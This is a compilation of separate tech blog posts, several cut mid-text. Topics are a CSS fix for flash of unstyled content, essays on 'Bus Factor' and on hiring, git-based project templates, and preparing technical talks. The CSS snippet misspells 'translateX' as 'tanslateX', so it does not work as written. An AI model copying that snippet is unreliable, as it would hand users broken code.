chunk of your time is spent synthesizing information (mostly updates) flowing across your node in the graph, from the top down and from the bottom up. </p><p>This is where we come in. At Middle Out, we're working on a solution that analyses user conversations, summarizes important segments into updates, and proposes these updates to users for final editing and approval before making them visible to the rest of the company. We then take these updates and show each user the ones our model believes are most useful to them. This is tantamount to getting rid of the fog-of-war that shrouds parts of any company from individual employees. In short, you'd see Beezlyboo coming a mile away. </p><figure><d-figure id="boldify"><div svelte-1667065745=""><div><p>Why did this not exist before? Why do people still update each other …</p></div></div></d-figure></figure></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>Today, I’ve finally decided to fix a bug I’ve been seeing for a long time,
which I always would leave for later as it was a minor bug. This bug is called
FOUC or Flash of Unpainted Content, so I decided to share with you these
2 solutions to this simple problem.</p>
<p>The problem is relatively simple, avoid showing unstyled HTML elements
scattered through the page while the CSS file is being loaded.</p>
<p>There are 2 solutions to this problem, a longer one and a quicker one, you
decide which one works best for you.</p>

<h2 id="solution-1">Solution 1:</h2>
<p>This solution is more complicated to implement but much better. The idea is to
extract critical CSS from the file and inline in the head. By saying critical
I mean all the styles of the above-the-fold content visible on the page load.</p>
<p>This technique will make the page instantly interactable without showing
unstyled elements, while the rest of the CSS file will load in async without
blocking.</p>
<p>There are a few NPM plugins to achieve this without going manually over files,
like <a href="https://github.com/addyosmani/critical">Critical</a>, <a href="https://github.com/filamentgroup/criticalCSS">CriticalCSS</a>…</p>
<h2 id="solution-2">Solution 2:</h2>
<p>A quicker solution would be hiding the HTML element while the CSS file is being
loaded. This not-so-great solution would make the time-to-interactivity longer,
but it will avoid showing unstyled elements.</p>
<p>By placing this CSS rule in the head of the HTML file, we will hide the page:</p>
<div><pre><code data-lang="html">&lt;<span>style</span>&gt;
  <span>html</span> {
    <span>transform</span>: <span>tanslateX</span>(<span>-100</span><span>%</span>);
  }
&lt;/<span>style</span>&gt;</code></pre></div>
<p>Then, in the CSS file, we’ll set the position to 0, which when loaded will
automatically reset the position previously set in the head:</p>
<div><pre><code data-lang="css"><span>html</span> {
  <span>transform</span>: translateX(<span>0</span>) <span>!important</span>;
}</code></pre></div>
<h2 id="conclusion">Conclusion</h2>
<p>Depending on the structure, urgency, and importance of the project you can
always consider one of the two solutions.</p>

October 24, 2020 | https://applieddivinitystudies.com/2020/10/15/bus-factor/ | <a href="https://web.archive.org/web/*/https://applieddivinitystudies.com/2020/10/15/bus-factor/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
       <p>A friend at a prominent tech company took last month off using their new covid policy. When he got back to work last week, he was horrified. Not to see that things had fallen apart in his absence, but to realize that they hadn’t. Overwhelmingly, life without him had continued as normal.</p>
<p>This is not a coincidence. A company dependent on a single person’s work has a single point of failure. In tech jargon, they have low Bus Factor, the number of people who would have to get hit by a bus for the project to fail. The higher your Bus Factor, the greater your institutional resilience.</p>
<p>But it’s hard to reconcile this experience with faith in an impactful career. If a firing squad executes a prisoner, we can say that each shooter is sufficient but not necessary. The success of the project depends on the shooters in aggregate, but not on any person in particular.</p>
<p>It’s easy to understand why an organization might want this kind of redundancy. Sure, it’s wasteful and inefficient, but it prevents the greatest threat to any company: giving employees leverage.</p>
<h3 id="The-Misery-of-Redundancy"><a href="#The-Misery-of-Redundancy" title="The Misery of Redundancy"></a>The Misery of Redundancy</h3><p>If you’re reading this, you’re probably well versed on sublinear returns to headcount. You know about the Mythical Man-Month, and understand that communication scales quadratically. You shudder at the thought of growing complexity.</p>
<p>But the untold story isn’t about efficiency, it’s about negative returns to engagement. One person on a project is personally responsible. Two people might manage to coordinate. Beyond that, you’re in the endless hellscape of team projects.</p>
<p>Remember the last time you were assigned partners in school? A team project is a game of chicken. Each participant signals their willingness to fail through procrastination, until finally at the last minute someone defects and does all the work. The more you care, the more you lose.</p>
<p>(At least those projects ended. As a friend once put it, the weirdest thing about working at large companies is that you’ll wake up one morning, have a new teammate randomly assigned to you, and proceed to see them 8 hours a day every day until one of you quits or dies.)</p>
<p>This is the world of high Bus Factor. The greater a project’s supposed “resilience”, the more each person becomes dispensable. Sufficient, but not necessary.</p>
<p>(Even if you’re working in a mission-driven company, your job is meaningless unless you’re personally responsible for the success of that mission. The US Government might be the single more important organization in the world. How do you think it feels to work as an entry level bureaucrat?)</p>
<p>Have you ever wondered why you spend so much time writing design docs and detailed PRs? Or why you’re constantly stuck in meetings explaining what you do to various groups of people? Or why your project has a separate engineer, EM, PM, Designer and Tech Lead? Maybe these are best practices, maybe we’ve all settled on the right way of doing things.</p>
<p>But they’re also ways of making sure that if you get hit by a bus, no one has to care.</p>
<h3 id="Self-Reinforcing-Churn"><a href="#Self-Reinforcing-Churn" title="Self-Reinforcing Churn"></a>Self-Reinforcing Churn</h3><p>Every large tech company runs performance reviews twice a year. Don’t ask me why, it’s the way things have always been done.</p>
<p>Simultaneously, the average tenure at these companies hovers at around 2 years.</p>
<p>That means that at any given point, fully one quarter of your teammates are totally checked out.</p>
<p>On the high end, there are people who know they’re leaving in the next year, and just have absolutely no reason to care. If you’re at the beginning of a new review cycle, you’re 6 months away from getting PIP’d, which means you’re 12 months away from getting fired.</p>
<p>Odds are, you’re going to lose the game of chicken. You might not have the most to lose, but unless you’re also quitting next cycle, you certainly don’t have the least.</p>
<p>For the employer, the upshot is that anyone can quit at any time. If you’re on a 12 person team, you might lose 3 people each half. The only viable response is to up the Bus Factor, layer on more redundancy, and limit the importance of each individual.</p>
<p>Of course, the irony is that it’s precisely this sense of replaceability that drives churn in the first place! The more employees are alienated, the more willing they are to leave as soon as their equity vests.</p>
<p>So this ends up being a vicious cycle where higher churn forces a higher Bus Factor, which causes alienation, which increases churn, and so on until you either die or become Oracle.</p>
<h3 id="Escaping-the-Labyrinth"><a href="#Escaping-the-Labyrinth" title="Escaping the Labyrinth"></a>Escaping the Labyrinth</h3><p>The flip side is that there’s still hope.</p>
<p>Since the cycle is self-reinforcing, we can break it in the middle and slay the ouroboros. There’s historical path dependence, but no fundamental reason we have to live this way.</p>
<p>The alternative to redundancy isn’t fragility, it’s personal responsibility. It’s keeping your Bus Factor low.</p>
<p>In this world, you can develop specific mastery instead of a broad assortment of skills. You can be a craftsman instead of a code monkey, understand systems deeply instead of cargo culting best practices.</p>
<p>Imagine working at a company where every single one of your coworkers gives a shit. Imagine knowing that your contributions are important, that the world is different because of your existence.</p>
<p>That’s Bus Factor 1.</p>
<p>As far as I can tell, this is basically how SpaceX works. It’s not a coincidence that they’re <a target="_blank" rel="noopener" href="https://www.payscale.com/data-packages/top-tech-companies-compared">ranked #1 for both stress and sense of meaning</a>. If you hear that employees are overworked and underpaid, don’t cry abuse, ask how they’re getting compensated instead.</p>
<h3 id="FAQ"><a href="#FAQ" title="FAQ"></a>FAQ</h3><p><strong>Why exactly does leverage even matter?</strong><br><em>A priori</em>, it shouldn’t. If all employees have leverage, there’s nothing to negotiate for. You could ask for more money, but everyone else could too, eventually the company falls apart and you all lose.</p>
<p>But <em>a posteriori</em>, we can work backwards from behavior. If companies are willing to sacrifice efficiency, that is itself evidence of exploitation.</p>
<p><strong>That sounds crazy. If engineers are actually underpaid, why don’t they just go somewhere else? Why doesn’t the market raise salaries?</strong><br>I’ve screened resumes from entry level engineers who claim to have saved their companies millions of dollars. The crazy part is that I believe it! If you can make even the smallest change to a ranking algorithm, or improve the performance of a costly computation, or run an experiment that marginally increases click-through rate, the effects multiply out across a huge user base.</p>
<p>And yet, I don’t know a single entry level engineer getting paid commensurately.</p>
<p>First, there’s a lack of counterfactual impact. Sure, you saved the company a million dollars, but if you didn’t take the job someone else would, and they would have done the same work.</p>
<p>Your impact looks huge, but in a high Bus Factor world, your actual impact is just the delta between your ability and the next best engineer. You might be able to negotiate another $10k, but not two orders of magnitude more.</p>
<p>Second, you don’t own the means of production. Your skills are only worth millions of dollars in the particular context of this company. You can’t walk away and produce that value on your own. You depend on the company much more than it depends on you.</p>
<p><strong>Hmm, maybe, but if firms have so much market power, why don’t they just keep Bus Factor low but set a strong precedent against adversarial negotiation?</strong><br>Great question. Since companies are good at internal coordination, and employees are bad at collective bargaining, firms ought to be able to keep salaries low even without increasing the Bus Factor.</p>
<p>You could just wait for someone to speak up, immediately fire them, take whatever financial hit comes from their project’s failure, but set the precedent for any future dissidents that negotiation is unacceptable.</p>
<p>The problem is, firms don’t handle negotiations, managers do, and their incentives are just as screwed up as yours. A manager stands to lose their career if too many projects fail, but it costs them nothing to advocate for your promotion. So in a low Bus Factor world, the tendency is always to default to generosity.</p>
<p>Why doesn’t this happen at SpaceX? Remember, none of this is actually about salaries or promotions, it’s about sociopathically pursuing leverage as an alternative to fulfilment when you have no other choices. This is all conditional on not being treated like a human, and not having a meaningful job.</p>
<p>In Bus Factor 1 world, you have too much personal responsibility to coast on momentum or free ride on a teammate’s accomplishments. More importantly, you might actually personally care.</p>
<p><strong>Wouldn’t running a company as Bus Factor 1 invite risk?</strong><br>Absolutely. SpaceX has blown up rockets. Tesla has missed deadlines. Neuralink is doing god knows what.</p>
<p>But management science, financial engineering and organizational design are filled with countless other methods for deferring risk.</p>
<p><strong>Okay fine, I’m sold, where do I sign up?</strong><br>Pretty much nowhere!</p>
<p>I’ve asked every friend, accepted every cold call from recruiters, and as far as I can tell, nearly no companies or even individual teams are run with Bus Factor 1. Again, maybe SpaceX, but I’m relaying that second hand.</p>
<p>If you find out, let me know. Or better yet, start it yourself and tell me!</p>

	<div>
		
<p>Another day, another HackerNews discussion about hiring being broken. The most recent one I saw was triggered by <a href="https://blog.alinelerner.com/ive-been-an-engineer-and-a-recruiter-hiring-is-broken-heres-why-and-heres-what-it-should-be-like-instead/">a blog post</a> by the formidable Aline Lerner (disclaimer: Aline is a friend and we collaborated on a <a href="https://www.holloway.com/g/technical-recruiting-hiring/about">hiring book</a> last year). Now, I 100% agree that hiring is broken, and Aline’s post is really thoughtful. In fact, a lot of “hiring is broken” articles are thoughtful.</p>



<p>But the discussion threads are something else—they miss the point of the article. The discussion threads are even more broken than hiring. And they’re really repetitive. They always do contain grains of truth, but inevitably have us reaching conclusions that are simplistic, and in my opinion, create a pretty bad attitude in the tech industry.</p>



<p><strong>Conclusion #1: “Hiring sucks for candidates, but hiring managers can do what they want</strong>“</p>



<p>The truth is that hiring is hard for everyone. There’s no question about it. It’s hard for both candidates and for hiring managers. Sure, FAANGs and the startup-du-jour might have a leg up, but most people who are hiring are trying to hire at a non-FAANG, non-sexy company. If you’ve never done it, you should try it at some point in your career. It’s an <em>incredibly </em>humbling experience. Or, at the very least, find a friend who’s spent time on hiring, and ask them for their favorite battle story.</p>



<p>And yes, on the balance, power and information asymmetry work out in favor of the companies hiring. And that asymmetry is much larger with FAANGs. But even FAANGs have to invest a tremendous amount of time and energy into hiring. It’s not really easy for anyone. </p>



<p>Especially if you want to do it <em>well</em>. Ask any successful leader (entrepreneur, manager) what they spend most of their time on, and it’ll either involve a large chunk spent on hiring (if they appreciate the problem and give it the attention it deserves) or dealing with the consequences of bad hiring (if they don’t).</p>



<p><strong>Conclusion #2: “Hiring is a crap-shoot—it’s a roll of the dice</strong>“</p>



<p>I strongly disagree with this one. When writing the <a href="https://www.holloway.com/g/technical-recruiting-hiring">Holloway Guide to Technical Hiring and Recruiting</a>, I got to interview dozens of really thoughtful hiring managers and recruiters. They were really good at their jobs. And there were some common themes. They were thoughtful about every step of their process. They kept their process balanced and fair, holding a high bar but respecting candidates and their time. They didn’t chase the same pool of candidates everyone else was chasing—instead, they found non-traditional ways to discover really talented and motivated people who weren’t in the pool of usual suspects. They were thoughtful about what signals they were looking for and how best to assess them. And, they deeply understood their team’s needs, and candidates’ needs, and were really good at deciding when there was or wasn’t a fit. But most of all, they were effective: they built really talented teams.</p>



<p>There are a handful of companies that have built amazing hiring engines, and the proof is that they’ve been able to put together really strong teams. You can generally tell that if a person worked at a certain company at a certain time, that person is probably incredibly intelligent and incredibly motivated (some examples are Google, Facebook, Stripe, Dropbox at different points in time). There will always be noise. Even the best hiring managers will sometimes make hiring mistakes. And of course, even the best engineers may not be a fit for every role or every company. </p>



<p>Again, hiring is hard. But there is not a shred of doubt in my mind that if you are thoughtful about it, you can hire well. And really, you don’t need to be perfect at it. You just need to be better than the rest.</p>



<p><strong>Conclusion #3: “FAANGs suck at hiring”</strong></p>



<p>This one has some truth to it, but it’s a lot more subtle than “FAANGs suck at hiring”. Because let’s face it, they do hire really smart people. Some of the smartest people I know are at FAANGs right now. So let’s decouple that statement a little more.</p>



<p>FAANGs <em>do </em>suck at parts of hiring, like their candidate experience. They can be really slow at making hiring decisions. Their hiring process might be tedious and seem arbitrary. But <em>they usually can get away with it</em>, <em>and you probably can’t!</em> They’ve got a strong brand, interesting technical challenges (interesting for some people, at least), and a lot of money. In fact, one FAANG VP of Engineering told me: “our process is what we can get away with”. To the point that they can even play it off as a positive: “our process is slow and long because we are <em>very</em> selective”.</p>



<p>And look, I’m sure FAANGs lose some talented candidates who get turned off by their “you’d-be-blessed-to-work-with-us” attitude. They definitely have a lot of room for improvement. But at the end of the day, they’re operating a process that’s delivering large quantities of really smart people at scale. In fact, I’d argue their internal processes around strategy, performance management / promotions, etc cause incredibly <em>more</em> damage to them than broken hiring—if you lose out on hiring one talented person when you have thousands applying to work for you, that’s one story, but if you hire someone really talented and driven, and they work for you for 6 to 12 months but don’t meet their potential and leave in bitter frustration… well, that’s a subject for another post)</p>



<p>“But”, people go on, “FAANGs <em>also</em> don’t know how to interview!” Which brings me to trope #4.</p>



<p><strong>Conclusion #4: “Whiteboard</strong> <strong>and algo/coding interviews suck”</strong></p>



<p>Again, this one has some truth to it, but if you just stop at the above statement, you miss the point.</p>



<p>Algo/coding interviews are one of the primary hiring mechanisms used by FAANG companies. And they are incredibly unpopular—at least in discussion threads. But big companies have spent years looking at their hiring data and feeding that back into their hiring process (coining the term “<a href="https://rework.withgoogle.com/subjects/people-analytics/">people analytics</a>” along the way).</p>



<p>The argument against them is usually a combination of:</p>



<ul><li>they really only assess pattern-matching skills (map a problem to something you’ve seen before)</li><li>they only assess willingness to spend time preparing for these types of interviews</li></ul>



<p>These are fair criticisms, but that doesn’t mean these interviews are actually terrible. I mean, they might be terrible for you if you’re interviewing and you don’t get the job. You’re probably a brilliant engineer, and I agree, these interviews certainly don’t fully assess your ability (or maybe you’re a shit engineer, I don’t know you personally). In any case, the leap from “this interview sucked for me” to “this interview sucks” is still pretty big.</p>



<p>If you’re a large tech co with a big brand and a salary scale that ranks at the top of&nbsp;<a href="https://www.levels.fyi/">Levels.fyi</a>, you probably get a lot of applications. So a good interview process is one that weeds out people who wouldn’t do well at your company. To do well at a large tech company, you need to (and I’m painting with a really broad brush, but this is true for 90% of roles at these companies):</p>



<ol><li>Some sort of problem-solving skill that’s a mix of raw intelligence and/or ability to solve problems by pattern-matching to things you’ve seen before.</li><li>Ability/commitment to work on something that may not&nbsp;<em>always&nbsp;</em>be that intrinsically motivating, in the context of getting/maintaining a well-paying job at a large, known company.</li></ol>



<p>Hopefully you can see where I’m going with this. Basically, the very criticisms thrown at these types of interviews are the reason they work well for these companies. They’re a good proxy for the work you’d be doing there and how willing you are to do it. If you’re good at pattern matching, and are willing to invest effort into practicing to get one of these jobs, you’ll probably do well at the job.</p>



<p>Not that there’s anything wrong with that type of work. I spent several years at big tech co’s, and the work was intellectually stimulating most of the time. But a lot of times it wasn’t. It was a lot of pattern-matching. Looking at how someone else had solved a problem in a different part of the code-base, and adapting that to my use-case.</p>



<p>On the other hand, if you’re a brilliant engineer who struggles with being told what to do or doing work that you can’t immediately connect to something intrinsically motivating to you, that FAANG interview just did both you and the company a favor by weeding you out of the process.</p>



<p>So the truth is, there is no single “best interview technique”. In our book, we wrote several chapters about different interviewing techniques and their pros and cons. In-person algo/coding interviews on a whiteboard, in-person interviews where you work in an existing code base, <a href="https://www.holloway.com/g/technical-recruiting-hiring/sections/take-homes">take-home interviews</a>, pairing together, having a trial period, etc all have pros and cons. The trick is finding a technique that works for both the company and the candidate. </p>



<p>And that can really differ from company to company and candidate to candidate. A VP at Netflix told me about how they had a really strong candidate come in, but when asked to do a whiteboard-type interview, informed them (politely) that they might as well just reject him then. He was no good at whiteboard interviews… But if they allowed him to go home and write some code, he’d be happy to talk through it. And since then, many Netflix teams have offered candidates the choice of doing a take home.</p>



<p>And really, any interview format can suck. It can fail to assess a candidate for the things a company needs and it can be a negative candidate experience. Which would you rather have:</p>



<ul><li>A whiteboard interview with heavy algorithms for a role where that knowledge (or ability to develop that knowledge) isn’t critical, delivered by an apathetic engineer who doesn’t care about their job.</li><li>A poorly-designed take-home, requiring skills that you don’t have and won’t need for the job, and that you spend hours thinking through and working on, send in, and get rejected without getting any feedback.</li></ul>



<p>Probably neither.</p>



<p><strong>So …</strong></p></div></article></main></section></div></div>

For example, I clone my <a href="https://github.com/jappeace/haskell-template-project">haskell template project</a>, edit the names, edit the <code>readme</code> end re-setup the&nbsp;remotes:</p><div><pre><span></span>git remote add template git@github.com:jappeace/haskell-template-project.git
git remote set-url origin git@github.com:jappeace/new-project.git
</pre></div><p>This allows me to keep my downstream project up to date with the template. When I discover another tool, this can be merged into the downstream project for example. It allows evolving the template over time as I learn more about whatever programming language I’m&nbsp;using.</p><p>It also gives me default branding. Which makes it look more ‘professional’. Although I don’t like branding, I know this is necessary. Having it there by default makes it so that I don’t forget to do&nbsp;this.</p><p>When starting a project you also gain some free authoritativeness, because you have a longer commit history the project looks like it is more mature. Although this practice is a little deceptive, there is a core of truth, because the template has gotten a lot of attention. If you feel offended by this practice, ask yourself first, why are you trusting git histories? These can be <a href="https://git-scm.com/book/en/v2/Git-Tools-Rewriting-History">rewritten anyway</a>. This authoritativeness also gives me a small moral boost. It just <em>feels</em> better to have a project with well thought out tools being started and some history rather then the ‘normal’ stuff everyone starts&nbsp;with.</p><h2 id="alternatives">Alternatives</h2><p>The alternatives are using tools that spit out templates. In the haskell world these are <a href="https://github.com/commercialhaskell/stack-templates">stack new</a>, <a href="https://cabal.readthedocs.io/en/latest/developing-packages.html#using-cabal-init">cabal init</a> or <a href="https://github.com/kowainik/summoner">summoner</a>. These tools are simply a glorified <code>sed</code> on projects folders: They find and replace variables. There is no versioning, there is no personalization except what limited variables&nbsp;give.</p><p>Because these tools don’t take into account history, the first commit will be a large commit with a message like ‘Initial’. I find this problematic because it squashes all the work that went into creating the template. Information is lost, for no&nbsp;reason.</p><p>These tools don’t use git to track their templates. They could, but they don’t. Maybe they wanted to be <span>VCS</span><sup id="fnref-1"><a href="#fn-1">2</a></sup> agnostic? I’m speculating, but even if you wanted to be that, you could still use any version system to track the template and recreate the history in the <span>VCS</span> desired by the user. This at least gives the user their history of the template back. While also giving them the choice of <span>VCS</span><sup id="fnref-8"><a href="#fn-8">3</a></sup></p><h2 id="a-template-hierarchy">A template&nbsp;hierarchy</h2><p>What I described in the intro can be taken a step further. A template of a template can be used to create another new template. For example, say you’re a fan of <a href="https://nixos.org/">nix</a> or <a href="https://www.gnu.org/software/make/manual/make.html">make</a>, so why not put a makefile and a <a href="https://nix.dev/tutorials/towards-reproducibility-pinning-nixpkgs.html#pinning-nixpkgs">nix pin</a> in some template of templates project. These tools don’t care about which language you use, so their configuration can be shared among Python, Java and Haskell projects for example. Maybe for github it could even have a partial travis or github actions <span>CI</span>&nbsp;setup.</p><p>Now, say you’re starting a new Python project, but have no template yet for that programming language. You simply clone this template of templates and customize it to your own <a href="https://stackoverflow.com/questions/25011078/what-does-pythonic-mean#:~:text=Pythonic%20means%20code%20that%20doesn,is%20intended%20to%20be%20used.">Pythonic</a> needs. You can still pull in the upstream changes from your template of templates, for example to upgrade the nix pin. The big advantage of course is that a change in the template of templates can easily merged into all downstream projects with&nbsp;git.</p><p>I convinced the reader that using git is the superior way for template management. It’s simpler, and more flexible. I also convinced the authors of stack, cabal and summoner to drop their current way of managing templates and use git&nbsp;instead.</p><p>Or, more likely, no-one read this&nbsp;far.</p></div><small></small></article><section></section><section></section></div></div>]]>

October 24, 2020 | https://www.jakeworth.com/how-i-talk/ | <a href="https://web.archive.org/web/*/https://www.jakeworth.com/how-i-talk/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I’ve been giving technical talks for a few years; I keep a list of each one
<a href="https://www.jakeworth.com/about/">here</a>. Speaking makes me nervous, and it’s a major time investment if
I’m doing it right. But it’s worth the effort, because it’s fueled my growth as
a developer.</p>
<p>I’m speaking at the Vim Chicago Meetup next month about integrating React.js
with Vim, and I’d like to use that as an excuse to write about my speaking
preparation process.</p>
<p>Some smart people have written on these subjects, and anything I’d have to say
leverages these ideas:</p>
<ul>
<li><a href="http://www.noelrappin.com/railsrx/2014/1/18/conference-prompts-or-how-to-submit-proposals-and-influence-people">Conference Prompts: Or How to Submit Proposals and Influence People</a></li>
<li><a href="http://www.inc.com/geoffrey-james/how-to-fix-your-presentations-21-tips.html">Fix Your Presentations: 21 Quick Tips</a></li>
<li><a href="https://www.deconstructconf.com/blog/how-to-prepare-a-talk">How to Prepare a Talk</a></li>
<li><a href="http://www.railstips.org/blog/archives/2010/05/05/improve-your-presentations-in-under-50/">Improve Your Presentations In Under $50</a></li>
<li><a href="http://speaking.io/">Speaking.io</a></li>
<li><a href="http://www.noelrappin.com/railsrx/2014/3/17/what-i-learned-from-reading-429-conference-proposals">What I learned from reading 429 conference proposals</a></li>
<li><a href="http://www.sarahmei.com/blog/2014/04/07/what-your-conference-proposal-is-missing">What Your Conference Proposal Is Missing</a></li>
</ul>
<p>Several of these writers talk about submitting conference proposals, AKA CFPs.
I don’t plan to cover that in depth. Why not? Because I don’t really know how
it works. I submitted more than a few proposals before getting accepted to
speak at my first conference, <a href="http://confreaks.tv/videos/railsconf2017-observing-chance-a-gold-master-test-in-practice">RailsConf 2017</a>. I believe once you
can write a compelling proposal, there is a significant element of luck to the
process. So, submit many proposals, and be like Thomas Jefferson, who one said:
“I’m a great believer in luck, and I find the harder I work the more I have of
it.”</p>
<p>I break my speaking process into four phases:</p>
<ol>
<li>Finding an idea</li>
<li>Brainstorming</li>
<li>Researching and preparing slides</li>
<li>Practice and Delivery</li>
</ol>
<p>I can’t claim these steps as essential; they just help me. My target reader is
somebody who wants to speak and has never done so before. I want you to walk
away with encouragement and a step-by-step, jargon-free checklist for preparing
a technical talk.</p>
<hr>
<h3>Finding an idea</h3>
<p>Talks are entertainment, and with the right passion, familiarity, and
freshness, I hope to produce something worth listening to.</p>
<p>Here’s a great primer on why you, reader, have valuable ideas:</p>
<ul>
<li><a href="http://www.noelrappin.com/railsrx/2014/1/18/conference-prompts-or-how-to-submit-proposals-and-influence-people">Conference Prompts: Or How to Submit Proposals and Influence People</a></li>
</ul>
<p>What ideas lead to great talks? My strongest talks share the following traits:</p>
<ol>
<li>I’m passionate about the idea</li>
<li>I know the subject well enough to master it in the allotted time</li>
<li>I’ve practiced the subject in the recent past</li>
</ol>
<p>To lend context, I’ll take a case study from the talk I’m preparing for next
month’s Vim Chicago and React Chicago Meetups, titled <em>React.js + Vim</em>.</p>
<h4>Passion</h4>
<p>I love Vim. Learning this 25-year-old text editor changed my career. I went
<a href="https://www.jakeworth.com/vim-or-bust">all-in</a> on Vim three years ago and have translated my passion
into organizing the Vim Chicago Meetup.  And, I also love React. React is my
tool of choice for the frontend.</p>
<p>Like any technical ability, writing React code well in Vim exists on a spectrum
ranging from barely-getting-it-done to ninja-flow-state.</p>
<p>It takes work to build your Vim into the perfect React development environment.
Writing React code means that I seek that perfection. What mappings, plugins,
and workflow hacks can I use to get there? It’s a subject that I care about,
and that’s the most important trait of a good talk.</p>
<h4>Familiarity</h4>
<p>An idea that’s explored in <a href="http://speaking.io/">Speaking.io</a> is that aspirational talks,
i.e.– “I want to know about this subject, so I’ll sign up for a talk and learn
it by the deadline”– can backfire. I’ve heard this idea referred to as Talk
Driven Development, and if it works for you, great.</p>
<p>I have to start with a foundation of understanding. I need to already be at
least at the same level of the average listener. Only then do I have a chance
at pushing myself and my listeners, with enough time and work, beyond that
level into unfamiliar ground.</p>
<h4>Freshness</h4>
<p>For passion to translate to an interesting talk, I need to have done the work
recently. When somebody is speaking about an idea that’s fresh in their mind,
the talk is better.</p>
<p>The ideas also have to be relevant to a developer working in the world right
now. In the case of <em>React.js + Vim</em>, the JavaScript ecosystem is constantly
changing, and any techniques I haven’t validated recently will likely be
outdated.</p>
<p>Another benefit of talking about recent completed work is that I’ve had time to
recognize the things I could have done better. I can integrate these lessons
into the talk.</p>
<hr>
<h3>Brainstorming</h3>
<p>Thinking about a subject, while also being a sponge to the world, combined with
an effective system of note-taking, is how I get from an idea to the first
draft of my talks.</p>
<p>Brainstorming is the most important part of the process, because it’s the
foundation for everything that follows. For me it has two parts:</p>
<ol>
<li>Thinking about the subject in an open-minded way, paying attention to ideas
that cross my mind, ideas in the world, and relevant ideas of my colleagues and
friends.</li>
<li>Recording <em>everything</em>.</li>
</ol>
<p>Here’s a little more about each step.</p>
<h4>Thinking</h4>
<p>To prepare a good talk, I generate a lot of ideas.</p>
<p>Stephen King’s <em>On Writing: A Memoir of the Craft</em> contains a useful anecdote.
As a young writer, King faced rejection after rejection. After much failure,
one editor took the time to offer King some advice, writing on his manuscript
“Get rid of 10%.” King removed 10% of the words from his manuscript, began
submitting it again, and soon landed his first publication deal. Cutting 10%,
sometimes again and again, became one of his most valuable tools.</p>
<p>For every idea that makes it into a talk, I’ve rejected five. This slaughter is
possible because I think about a subject for hours in an open-minded way.
Listening to technical news and blog posts and the people around me, reading
code, and writing things down. With this mindset, I cultivate a long list of
ideas which will help me fill out the time.</p>
<p>Leading up to a talk, I like to solicit ideas from my coworkers and the general
programming. I had some great conversations and received many ideas through our
company Slack. Borrowing ideas from others makes your talk stronger against the
inevitable blind spots we all possess.</p>
<p>Here is some of my current brainstorm list for my talk next month. I check off
an idea when I’ve researched it. Stuff that I want to pursue further gets
marked <code>[x]</code>, and the rest gets marked <code>[-]</code>.</p>
<div data-language="markdown"><pre><code><span><span>###</span> Reactjs + Vim Talk Ideas</span>

<span>-</span> [x] Build the talk from a blank virtual box
<span>-</span> [ ] Writing JS in Vim – Alex LaFroscia – Medium
<span>-</span> [ ] Investigate <span>`.eshintrc`</span> settings
<span>-</span> [ ] Go top to bottom through a JSX file and find optimizations
<span>-</span> [ ] Vim nnoremap: <span>`\p — :! prettier %`</span>
<span>-</span> [ ] Technologist often arrive at the same idea independently (PrettierJS)
<span>-</span> [ ] Linting solves needless churn and technical debating
<span>-</span> [ ] Ale plugin
<span>-</span> [ ] CLTab
<span>-</span> [ ] <span>`CTRL X + CTRL L`</span> <span>-</span> tab complete import statements
<span>-</span> [ ] Vim-surround plugin for JSX</code></pre></div>
<p>Most of these ideas aren’t good. But they give me options.</p>
<p>This is a brain exercise, so don’t be tired, distracted, or under any kind of
pressure.</p>
<h4>Record Everything</h4>
<p>I use <a href="http://gettingthingsdone.com/">GTD</a> for taking notes in a physical notebook. Whatever your method,
be sure to capture every one of the great ideas you generate. Without a
rigorous system of note-taking, I would lose a lot of the ideas to simple
forgetfulness.</p>
<hr>
<h3>Researching and Preparing Slides</h3>
<p>Researching and preparing the slides is a unique process and these ideas have
worked for me in the past. Experimenting and automating my process has helped
me to develop talks that are detailed and hopefully interesting to watch.</p>
<h4>Research</h4>
<p>When possible, I start in an unusual place for tech: the library. Libraries
contain a wealth of information on many technical subjects. Connecting a
topical web development subject to the history of computers or human inquiry is
something Sandi Metz, a speaker I admire, does well. Even when the material
isn’t there waiting to be found, there’s always something, as well as
professionals who can help you devise a research strategy.</p>
<p>Technical talks, often mislabeled ‘hard’ talks, are what I prepare most often.
They require experimentation. I use the ideas I found during to try a lot of
experiments in my text editor or REPL. Which are worth explaining?</p>
<h4>Preparing Slides</h4>
<p>After trying PowerPoint, Keynote, and even Vim buffers navigated with <code>]f</code> and
<code>[f</code> (an idea I borrowed from Steve Klabnik; not recommended unless you’re an
unflappable speaker), I discovered <a href="https://www.decksetapp.com/">Deckset</a>.</p>
<p>Deckset is a feature-rich markdown slide builder, and I love it. If you know
markdown, Deckset is fantastic. It lets me crank out ideas and
proofs-of-concept right in my editor. If you feel that the hardest part of
preparing a talk is putting together the visuals and notes you need to speak,
then Deckset is worth trying.</p>
<p>As for slide design, I follow the guidelines put forth in
<a href="http://speaking.io/">Speaking.io</a> and the Chicago Ruby Meetup speaking guidelines. To
summarize:</p>
<ol>
<li>Make your text as big as you can.</li>
<li>Use the most basic code examples that you can.</li>
<li>Use high contrast colors, like black text on a white background. Subtle
palettes like Zenburn don’t work on a projector.</li>
<li>Don’t show code unless you want your audience to read every line; they will.</li>
</ol>
<p>My talks don’t feature funny GIFs, pictures, or video. Why? I don’t trust
myself to be funny, and don’t want to invest any of the time I have to prepare
on that quadrant. It’s a strategy.</p>
<p>I structure my talks like essays, with an introduction, thesis, 3-4 supporting
points, and a conclusion. Formulaic, but it works.</p>
<p>Something I often ponder is: could this be a blog post? One of the less
effective types of presentations could be summarized as a person reading a blog
post they wrote. A telltale sign of such a talk is when the speaker concludes
with a link to a blog post with the same title as the talk. I’ve given a few
like this that I didn’t love. A good talk isn’t a recipe for solving some
narrow problem, it’s a performance that would fall flat on a page.</p>
<hr>
<h3>Practice and Delivery</h3>
<h4>Practice</h4>
<p>Practice is everything. I run through the entire talk without stopping at least
10-20 times prior to any presentation. I do every rehearsal with a visible
timer, standing at a podium, projecting my slides onto something, even just a
television screen, even wearing the type of clothing I’ll be wearing at the
presentation.</p>
<p>I practice setting up my …</p></div></div>

<h3>Sidebar: What is Fluree?</h3>



